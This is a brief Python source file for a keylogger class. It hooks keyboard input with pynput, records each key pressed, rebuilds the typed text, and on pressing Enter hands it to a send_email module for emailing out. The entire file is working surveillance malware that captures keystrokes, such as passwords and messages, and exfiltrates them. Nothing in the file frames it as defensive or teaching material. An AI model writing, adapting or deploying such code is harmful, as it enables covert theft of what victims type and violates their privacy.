import pynput
from pynput.keyboard import Key, Listener
from . import send_email


class Keylogger:
    def __init__(self):
        self.count = 0
        self.keys = []

    def on_press(self, key):
        print(key, end=" ")
        print("pressed")
        self.keys.append(str(key))

    def email(self):
        message = ""
        for key in self.keys:
            k = key.replace("'", "")
            if key == "Key.space":
                k = " "
            if key[0] == 'K' and key[1] == 'e' and key[2] == 'y':
                k = ""
            elif key.find("Key") > 0:
                continue
            message += k

        print(message)
        send_email.sendEmail(message)

    def on_release(self, key):

        if key == Key.esc:
            return False

        if key == Key.enter:
            self.email()
            return False

    def run(self):
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

